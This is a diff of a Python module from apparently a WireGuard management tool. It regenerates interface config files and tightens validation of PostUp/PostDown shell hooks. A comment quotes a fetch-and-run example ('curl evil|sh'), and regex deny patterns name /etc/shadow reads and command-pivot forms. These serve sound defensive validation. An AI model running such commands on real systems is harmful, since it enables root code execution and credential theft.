@@ -27,8 +27,8 @@ from dataclasses import dataclass, field
 from pathlib import Path
 
 from ..db.sqlite_interfaces import (
-    get_interface,
-    list_interfaces,
+	get_interface,
+	list_interfaces,
 )
 from ..db.sqlite_nodes import get_all_tunnel_peer_ids
 from ..utils.network import allowed_ips_with_dns_routes
@@ -38,13 +38,13 @@ from .wireguard_isolation import build_client_isolation_post_rules, extract_peer
 _log = logging.getLogger(__name__)
 
 __all__ = [
-    "ConfigWriteError",
-    "InterfaceNotFoundError",
-    "RegenResult",
-    "allowed_ips_with_dns_routes",
-    "regenerate_all_configs",
-    "sync_interface_config",
-    "write_interface_config",
+	"ConfigWriteError",
+	"InterfaceNotFoundError",
+	"RegenResult",
+	"allowed_ips_with_dns_routes",
+	"regenerate_all_configs",
+	"sync_interface_config",
+	"write_interface_config",
 ]
 
 # wg-quick executes PostUp/PostDown through a shell, so anything that can
@@ -53,22 +53,22 @@ __all__ = [
 # subshells/substitution, globbing and quoting.
 _SHELL_METACHARACTERS = re.compile(r'[`$\\|&<>(){}\[\]!*?\'"\n\r\t]')
 
+_MAX_HOOK_BYTES = 2048
+
 # Path traversal and direct reads of sensitive files.
-_DANGEROUS_SHELL = re.compile(r'\.\.|/etc/passwd|/etc/shadow')
+_DANGEROUS_SHELL = re.compile(r"\.\.|/etc/passwd|/etc/shadow")
 
 # Sub-command forms that pivot an allowlisted binary into arbitrary execution,
 # e.g. "ip netns exec ns sh" or "nft -f /attacker/file".
-_COMMAND_PIVOT = re.compile(
-    r'(?:^|\s)(?:netns\s+exec|-f|--file|-c|--command|xargs|exec|eval|source)(?:\s|$)'
-)
+_COMMAND_PIVOT = re.compile(r"(?:^|\s)(?:netns\s+exec|-f|--file|-c|--command|xargs|exec|eval|source)(?:\s|$)")
+
 
 class InterfaceNotFoundError(Exception):
-    """Raised when interface does not exist in database."""
-
+	"""Raised when interface does not exist in database."""
 
 
 class ConfigWriteError(Exception):
-    """Raised when config write operation fails."""
+	"""Raised when config write operation fails."""
 
 
 # Interface names are used to build config_path / f"{name}.conf" below. This
@@ -81,303 +81,300 @@ _IFACE_NAME_RE = re.compile(r"^[a-zA-Z][a-zA-Z0-9_-]{0,14}$")
 
 
 def _validate_interface_name_for_fs(name: str) -> str:
-    """Re-validate an interface name immediately before it is used in a file path."""
-    if not _IFACE_NAME_RE.fullmatch(name):
-        raise ConfigWriteError(f"Refusing to write config for unsafe interface name: {name!r}")
-    return name
-
+	"""Re-validate an interface name immediately before it is used in a file path."""
+	if not _IFACE_NAME_RE.fullmatch(name):
+		raise ConfigWriteError(f"Refusing to write config for unsafe interface name: {name!r}")
+	return name
 
 
 @dataclass
 class RegenResult:
-    """Result of regenerating all interface configs."""
+	"""Result of regenerating all interface configs."""
 
-    succeeded: list[str] = field(default_factory=list)
-    failed: dict[str, str] = field(default_factory=dict)  # interface_name → error
-    key_mismatch: bool = False  # True if any failure was due to wrong SECRET_KEY
+	succeeded: list[str] = field(default_factory=list)
+	failed: dict[str, str] = field(default_factory=dict)  # interface_name → error
+	key_mismatch: bool = False  # True if any failure was due to wrong SECRET_KEY
 
 
 def _validate_hook(value: str, label: str) -> str:
-    """Validate PostUp/PostDown hook for safe shell execution.
+	"""Validate PostUp/PostDown hook for safe shell execution.
 
-    Raises:
-        ValueError: If hook contains unsafe patterns.
-    """
-    if not value:
-        return value
+	Raises:
+	    ValueError: If hook contains unsafe patterns.
+	"""
+	if not value:
+		return value
 
-    # Reject anything that can start a new command word. A prefix allowlist
-    # alone is not a security boundary: "ip link show && curl evil|sh" starts
-    # with an allowed binary but still runs arbitrary code as root.
-    if _SHELL_METACHARACTERS.search(value):
-        raise ValueError(
-            f"Unsafe {label} hook contains shell metacharacters. "
-            "Only plain iptables/ip6tables/ip/sysctl/nft invocations separated by ';' are allowed."
-        )
+	# ASCII only: wg-quick runs hooks via a shell, so avoid homoglyph and locale tricks.
+	if len(value.encode("utf-8")) > _MAX_HOOK_BYTES:
+		raise ValueError(f"{label} hook too long (max {_MAX_HOOK_BYTES} bytes)")
+	if not all(32 <= ord(c) <= 126 or c in "\n\t" for c in value):
+		raise ValueError(f"{label} hook must be printable ASCII")
 
-    if _DANGEROUS_SHELL.search(value):
-        raise ValueError(f"Unsafe {label} hook contains dangerous shell characters")
+	# Reject anything that can start a new command word. A prefix allowlist
+	# alone is not a security boundary: "ip link show && curl evil|sh" starts
+	# with an allowed binary but still runs arbitrary code as root.
+	if _SHELL_METACHARACTERS.search(value):
+		raise ValueError(
+			f"Unsafe {label} hook contains shell metacharacters. Only plain iptables/ip6tables/ip/sysctl/nft invocations separated by ';' are allowed."
+		)
 
-    # Validate each command in the hook
-    for raw_cmd in value.split(";"):
-        cmd = raw_cmd.strip()
-        if not cmd:
-            continue
-        # Allow only known-safe network/firewall commands
-        if not cmd.startswith(("iptables ", "ip6tables ", "ip ", "sysctl ", "nft ")):
-            raise ValueError(
-                f"Unsafe {label} command: {cmd!r}. Only iptables/ip6tables/ip/sysctl/nft commands allowed."
-            )
-        # Block sub-commands that turn an allowed binary into a launcher.
-        if _COMMAND_PIVOT.search(cmd):
-            raise ValueError(
-                f"Unsafe {label} command: {cmd!r} uses a sub-command that can execute arbitrary programs."
-            )
+	if _DANGEROUS_SHELL.search(value):
+		raise ValueError(f"Unsafe {label} hook contains dangerous shell characters")
 
-    return value
+	# Validate each command in the hook
+	for raw_cmd in value.split(";"):
+		cmd = raw_cmd.strip()
+		if not cmd:
+			continue
+		# Allow only known-safe network/firewall commands
+		if not cmd.startswith(("iptables ", "ip6tables ", "ip ", "sysctl ", "nft ")):
+			raise ValueError(f"Unsafe {label} command: {cmd!r}. Only iptables/ip6tables/ip/sysctl/nft commands allowed.")
+		# Block sub-commands that turn an allowed binary into a launcher.
+		if _COMMAND_PIVOT.search(cmd):
+			raise ValueError(f"Unsafe {label} command: {cmd!r} uses a sub-command that can execute arbitrary programs.")
+
+	return value
 
 
 def write_interface_config(
-    config_path: Path,
-    name: str,
-    private_key: str,
-    address: str,
-    listen_port: int,
-    dns: str | None,
-    post_up: str | None,
-    post_down: str | None,
-    conn: sqlite3.Connection,
-    address6: str | None = None,
-    pepper: str = "",
+	config_path: Path,
+	name: str,
+	private_key: str,
+	address: str,
+	listen_port: int,
+	dns: str | None,
+	post_up: str | None,
+	post_down: str | None,
+	conn: sqlite3.Connection,
+	address6: str | None = None,
+	pepper: str = "",
 ) -> None:
-    """Write a WireGuard interface config file including all peers.
+	"""Write a WireGuard interface config file including all peers.
 
-    NOTE: This function mixes concerns (DB queries + file I/O). For testability,
-    consider refactoring into separate query/render/write functions.
+	NOTE: This function mixes concerns (DB queries + file I/O). For testability,
+	consider refactoring into separate query/render/write functions.
 
-    Config files are regenerated from the encrypted database on each container
-    restart, so persistence on disk is acceptable.
-    """
-    if post_up:
-        post_up = _validate_hook(post_up, "PostUp")
-    if post_down:
-        post_down = _validate_hook(post_down, "PostDown")
+	Config files are regenerated from the encrypted database on each container
+	restart, so persistence on disk is acceptable.
+	"""
+	if post_up:
+		post_up = _validate_hook(post_up, "PostUp")
+	if post_down:
+		post_down = _validate_hook(post_down, "PostDown")
 
-    private_key_plain = vault_decrypt(private_key, pepper)
+	private_key_plain = vault_decrypt(private_key, pepper)
 
-    addr_parts = [address]
-    if address6:
-        addr_parts.append(address6)
+	addr_parts = [address]
+	if address6:
+		addr_parts.append(address6)
 
-    config_lines = [
-        "[Interface]",
-        f"PrivateKey = {private_key_plain}",
-        f"Address = {', '.join(addr_parts)}",
-        f"ListenPort = {listen_port}",
-    ]
+	config_lines = [
+		"[Interface]",
+		f"PrivateKey = {private_key_plain}",
+		f"Address = {', '.join(addr_parts)}",
+		f"ListenPort = {listen_port}",
+	]
 
+	del private_key_plain
 
-    del private_key_plain
+	# NOTE: DNS is intentionally omitted from the server-side config.
+	# The server doesn't need DNS routing through itself - DNS belongs only
+	# in the CLIENT config (PeerConfig) that peers download. The parameter stays
+	# in the signature so callers keep passing the interface's configured value
+	# and this stays the one place that decides to drop it; `del` says so out
+	# loud rather than leaving it looking forgotten.
+	del dns
 
-    # NOTE: DNS is intentionally omitted from the server-side config.
-    # The server doesn't need DNS routing through itself - DNS belongs only
-    # in the CLIENT config (PeerConfig) that peers download. The parameter stays
-    # in the signature so callers keep passing the interface's configured value
-    # and this stays the one place that decides to drop it; `del` says so out
-    # loud rather than leaving it looking forgotten.
-    del dns
-
-    # Query all peers (enabled + disabled) for this interface
-    # Fetch tunnel peer IDs so we can use expanded allowed_ips for them
-    tunnel_peer_ids = get_all_tunnel_peer_ids(conn)
-    cur = conn.execute(
-        """
+	# Query all peers (enabled + disabled) for this interface
+	# Fetch tunnel peer IDs so we can use expanded allowed_ips for them
+	tunnel_peer_ids = get_all_tunnel_peer_ids(conn)
+	cur = conn.execute(
+		"""
         SELECT id, public_key, preshared_key, peer_address, allowed_ips, allowed_ips_mode, client_isolation, is_enabled
         FROM peers
         WHERE interface = ?
         ORDER BY is_enabled DESC, public_key
         """,
-        (name,),
-    )
-    peer_rows = cur.fetchall()
-    isolated_v4_ips: list[str] = []
-    isolated_v6_ips: list[str] = []
+		(name,),
+	)
+	peer_rows = cur.fetchall()
+	isolated_v4_ips: list[str] = []
+	isolated_v6_ips: list[str] = []
 
-    for peer_row in peer_rows:
-        # Disabled peers: add a comment for audit trail
-        if not peer_row["is_enabled"]:
-            config_lines.append("")
-            config_lines.append(f"# [Peer] {peer_row['public_key'][:16]}... (DISABLED)")
-            continue
+	for peer_row in peer_rows:
+		# Disabled peers: add a comment for audit trail
+		if not peer_row["is_enabled"]:
+			config_lines.append("")
+			config_lines.append(f"# [Peer] {peer_row['public_key'][:16]}... (DISABLED)")
+			continue
 
-        if not peer_row["peer_address"]:
-            continue  # Skip peers without assigned address
+		if not peer_row["peer_address"]:
+			continue  # Skip peers without assigned address
 
-        # Check client_isolation flag for server-side firewall rules
-        if peer_row["client_isolation"]:
-            ipv4, ipv6 = extract_peer_ips(peer_row["peer_address"])
-            if ipv4:
-                isolated_v4_ips.append(ipv4)
-            if ipv6:
-                isolated_v6_ips.append(ipv6)
+		# Check client_isolation flag for server-side firewall rules
+		if peer_row["client_isolation"]:
+			ipv4, ipv6 = extract_peer_ips(peer_row["peer_address"])
+			if ipv4:
+				isolated_v4_ips.append(ipv4)
+			if ipv6:
+				isolated_v6_ips.append(ipv6)
 
-        config_lines.append("")
-        config_lines.append("[Peer]")
-        config_lines.append(f"PublicKey = {peer_row['public_key']}")
+		config_lines.append("")
+		config_lines.append("[Peer]")
+		config_lines.append(f"PublicKey = {peer_row['public_key']}")
 
-        if peer_row["preshared_key"]:
-            # Decrypt PSK, use immediately, then clear from memory
-            psk_plain = vault_decrypt(peer_row["preshared_key"], pepper)
-            config_lines.append(f"PresharedKey = {psk_plain}")
-            del psk_plain  # Minimize window for secret in memory
+		if peer_row["preshared_key"]:
+			# Decrypt PSK, use immediately, then clear from memory
+			psk_plain = vault_decrypt(peer_row["preshared_key"], pepper)
+			config_lines.append(f"PresharedKey = {psk_plain}")
+			del psk_plain  # Minimize window for secret in memory
 
-        # Tunnel peers need expanded allowed_ips (includes all client IPs
-        # assigned to the node) so master's WireGuard accepts DNS packets
-        # with original client source IPs forwarded through the node tunnel.
-        if peer_row["id"] in tunnel_peer_ids and peer_row["allowed_ips"]:
-            config_lines.append(f"AllowedIPs = {peer_row['allowed_ips']}")
-        else:
-            config_lines.append(f"AllowedIPs = {peer_row['peer_address']}")
+		# Tunnel peers need expanded allowed_ips (includes all client IPs
+		# assigned to the node) so master's WireGuard accepts DNS packets
+		# with original client source IPs forwarded through the node tunnel.
+		if peer_row["id"] in tunnel_peer_ids and peer_row["allowed_ips"]:
+			config_lines.append(f"AllowedIPs = {peer_row['allowed_ips']}")
+		else:
+			config_lines.append(f"AllowedIPs = {peer_row['peer_address']}")
 
-    # Append dynamic client-isolation firewall rules.
-    v4_subnet = None
-    with contextlib.suppress(ValueError):
-        v4_subnet = str(ipaddress.ip_interface(address).network)
+	# Append dynamic client-isolation firewall rules.
+	v4_subnet = None
+	with contextlib.suppress(ValueError):
+		v4_subnet = str(ipaddress.ip_interface(address).network)
 
-    v6_subnet = None
-    if address6:
-        with contextlib.suppress(ValueError):
-            v6_subnet = str(ipaddress.ip_interface(address6).network)
+	v6_subnet = None
+	if address6:
+		with contextlib.suppress(ValueError):
+			v6_subnet = str(ipaddress.ip_interface(address6).network)
 
-    isolation_up, isolation_down = build_client_isolation_post_rules(
-        name,
-        v4_subnet=v4_subnet,
-        v6_subnet=v6_subnet,
-        isolated_v4_ips=isolated_v4_ips,
-        isolated_v6_ips=isolated_v6_ips,
-    )
+	isolation_up, isolation_down = build_client_isolation_post_rules(
+		name,
+		v4_subnet=v4_subnet,
+		v6_subnet=v6_subnet,
+		isolated_v4_ips=isolated_v4_ips,
+		isolated_v6_ips=isolated_v6_ips,
+	)
 
-    post_up_parts: list[str] = []
-    post_down_parts: list[str] = []
-    if post_up:
-        post_up_parts.append(post_up)
-    if post_down:
-        post_down_parts.append(post_down)
-    post_up_parts.extend(isolation_up)
-    post_down_parts.extend(isolation_down)
+	post_up_parts: list[str] = []
+	post_down_parts: list[str] = []
+	if post_up:
+		post_up_parts.append(post_up)
+	if post_down:
+		post_down_parts.append(post_down)
+	post_up_parts.extend(isolation_up)
+	post_down_parts.extend(isolation_down)
 
-    # Insert PostUp/PostDown before first [Peer] section (or at end of [Interface] block)
-    peer_start = next(
-        (i for i, line in enumerate(config_lines) if line == "[Peer]"),
-        len(config_lines),
-    )
-    if post_down_parts:
-        config_lines.insert(peer_start, f"PostDown = {'; '.join(post_down_parts)}")
-    if post_up_parts:
-        config_lines.insert(peer_start, f"PostUp = {'; '.join(post_up_parts)}")
+	# Insert PostUp/PostDown before first [Peer] section (or at end of [Interface] block)
+	peer_start = next(
+		(i for i, line in enumerate(config_lines) if line == "[Peer]"),
+		len(config_lines),
+	)
+	if post_down_parts:
+		config_lines.insert(peer_start, f"PostDown = {'; '.join(post_down_parts)}")
+	if post_up_parts:
+		config_lines.insert(peer_start, f"PostUp = {'; '.join(post_up_parts)}")
 
-    config_content = "\n".join(config_lines) + "\n"
+	config_content = "\n".join(config_lines) + "\n"
 
-    # NOTE: config_path.mkdir() should ideally be done once at startup, not per-write.
-    # Doing it here masks deployment issues but ensures robustness.
-    _validate_interface_name_for_fs(name)
-    config_path.mkdir(parents=True, exist_ok=True)
-    conf_file = config_path / f"{name}.conf"
+	# NOTE: config_path.mkdir() should ideally be done once at startup, not per-write.
+	# Doing it here masks deployment issues but ensures robustness.
+	_validate_interface_name_for_fs(name)
+	config_path.mkdir(parents=True, exist_ok=True)
+	conf_file = config_path / f"{name}.conf"
 
-    # Atomic write: write to temp file, chmod, then replace
-    fd, temp_path = tempfile.mkstemp(dir=str(config_path), suffix=".tmp")
-    try:
-        os.write(fd, config_content.encode("utf-8"))
-        os.fchmod(fd, 0o600)
-    finally:
-        os.close(fd)
+	# Atomic write: write to temp file, chmod, then replace
+	fd, temp_path = tempfile.mkstemp(dir=str(config_path), suffix=".tmp")
+	try:
+		os.write(fd, config_content.encode("utf-8"))
+		os.fchmod(fd, 0o600)
+	finally:
+		os.close(fd)
 
-    try:
-        # Path.replace() is os.replace(): atomic within one filesystem.
-        Path(temp_path).replace(conf_file)
-    except Exception:
-        with contextlib.suppress(OSError):
-            Path(temp_path).unlink()
-        raise
+	try:
+		# Path.replace() is os.replace(): atomic within one filesystem.
+		Path(temp_path).replace(conf_file)
+	except Exception:
+		with contextlib.suppress(OSError):
+			Path(temp_path).unlink()
+		raise
 
-
-    del config_content, config_lines
+	del config_content, config_lines
 
 
 def regenerate_all_configs(
-    config_path: Path,
-    conn: sqlite3.Connection,
-    pepper: str = "",
+	config_path: Path,
+	conn: sqlite3.Connection,
+	pepper: str = "",
 ) -> RegenResult:
-    """Regenerate all WireGuard configs from database.
+	"""Regenerate all WireGuard configs from database.
 
-    Returns:
-        RegenResult with lists of succeeded/failed interfaces.
-    """
-    interfaces = list_interfaces(conn)
-    result = RegenResult()
+	Returns:
+	    RegenResult with lists of succeeded/failed interfaces.
+	"""
+	interfaces = list_interfaces(conn)
+	result = RegenResult()
 
-    for iface in interfaces:
-        if not iface["is_enabled"]:
-            continue
-        try:
-            write_interface_config(
-                config_path,
-                iface["name"],
-                iface["private_key"],
-                iface["address"],
-                iface["listen_port"],
-                iface["dns"],
-                iface["post_up"],
-                iface["post_down"],
-                conn,
-                address6=iface["address6"],
-                pepper=pepper,
-            )
-            result.succeeded.append(iface["name"])
-            _log.info("CONFIG_REGENERATED interface=%s", iface["name"])
-        except Exception as e:
-            error_msg = str(e)
-            result.failed[iface["name"]] = error_msg
-            _log.error("CONFIG_REGENERATE_FAILED interface=%s error=%s", iface["name"], error_msg)
-            # Detect key mismatch from vault decrypt errors
-            if "wrong WIREBUDDY_SECRET_KEY" in error_msg:
-                result.key_mismatch = True
+	for iface in interfaces:
+		if not iface["is_enabled"]:
+			continue
+		try:
+			write_interface_config(
+				config_path,
+				iface["name"],
+				iface["private_key"],
+				iface["address"],
+				iface["listen_port"],
+				iface["dns"],
+				iface["post_up"],
+				iface["post_down"],
+				conn,
+				address6=iface["address6"],
+				pepper=pepper,
+			)
+			result.succeeded.append(iface["name"])
+			_log.info("CONFIG_REGENERATED interface=%s", iface["name"])
+		except Exception as e:
+			error_msg = str(e)
+			result.failed[iface["name"]] = error_msg
+			_log.error("CONFIG_REGENERATE_FAILED interface=%s error=%s", iface["name"], error_msg)
+			# Detect key mismatch from vault decrypt errors
+			if "wrong WIREBUDDY_SECRET_KEY" in error_msg:
+				result.key_mismatch = True
 
-    return result
+	return result
 
 
 def sync_interface_config(
-    config_path: Path,
-    interface_name: str,
-    conn: sqlite3.Connection,
-    pepper: str = "",
+	config_path: Path,
+	interface_name: str,
+	conn: sqlite3.Connection,
+	pepper: str = "",
 ) -> None:
-    """Sync a single interface config file with DB state.
+	"""Sync a single interface config file with DB state.
 
-    Raises:
-        InterfaceNotFoundError: If interface does not exist in database.
-        ConfigWriteError: If config write fails.
-    """
-    iface = get_interface(conn, interface_name)
-    if not iface:
-        raise InterfaceNotFoundError(f"Interface not found: {interface_name}")
+	Raises:
+	    InterfaceNotFoundError: If interface does not exist in database.
+	    ConfigWriteError: If config write fails.
+	"""
+	iface = get_interface(conn, interface_name)
+	if not iface:
+		raise InterfaceNotFoundError(f"Interface not found: {interface_name}")
 
-    try:
-        write_interface_config(
-            config_path,
-            iface["name"],
-            iface["private_key"],
-            iface["address"],
-            iface["listen_port"],
-            iface["dns"],
-            iface["post_up"],
-            iface["post_down"],
-            conn,
-            address6=iface["address6"],
-            pepper=pepper,
-        )
-    except Exception as e:
-        _log.warning("CONFIG_SYNC_FAILED interface=%s error=%s", interface_name, e)
-        raise ConfigWriteError(f"Failed to write config for {interface_name}") from e
-
+	try:
+		write_interface_config(
+			config_path,
+			iface["name"],
+			iface["private_key"],
+			iface["address"],
+			iface["listen_port"],
+			iface["dns"],
+			iface["post_up"],
+			iface["post_down"],
+			conn,
+			address6=iface["address6"],
+			pepper=pepper,
+		)
+	except Exception as e:
+		_log.warning("CONFIG_SYNC_FAILED interface=%s error=%s", interface_name, e)
+		raise ConfigWriteError(f"Failed to write config for {interface_name}") from e
